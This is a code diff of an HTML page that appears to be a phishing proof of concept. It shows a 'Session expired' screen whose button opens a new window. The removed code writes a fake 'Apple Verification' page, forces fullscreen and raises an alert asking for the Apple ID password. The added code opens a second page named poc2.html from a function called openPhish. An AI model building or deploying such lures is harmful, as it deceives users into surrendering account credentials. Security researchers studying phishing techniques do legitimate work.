@@ -6,36 +6,25 @@
     body {
       font-family: -apple-system, sans-serif;
       display: flex;
-      height: 100vh;
       align-items: center;
       justify-content: center;
+      height: 100vh;
       flex-direction: column;
     }
     button {
-      font-size: 18px;
-      padding: 12px 24px;
+      padding: 14px 28px;
+      font-size: 16px;
     }
   </style>
 </head>
 <body>
-  <h2>Session expired. Please login again.</h2>
-  <button onclick="spoof()">Login Again</button>
+  <h2>Session expired</h2>
+  <p>Please login again to continue.</p>
+  <button onclick="openPhish()">Re-Login</button>
 
   <script>
-    function spoof() {
-      const win = window.open("about:blank", "_blank");
-      win.document.write(`
-        <body style="margin:0;display:flex;align-items:center;justify-content:center;flex-direction:column;font-family:sans-serif;">
-          <h2>🔒 Apple Verification</h2>
-          <p>Please wait...</p>
-          <script>
-            document.documentElement.requestFullscreen();
-            setTimeout(() => {
-              alert('🔒 Apple ID session expired. Please re-enter your password to continue.');
-            }, 1200);
-          <\/script>
-        </body>
-      `);
+    function openPhish() {
+      const win = window.open("poc2.html", "_blank");
     }
   </script>
 </body>
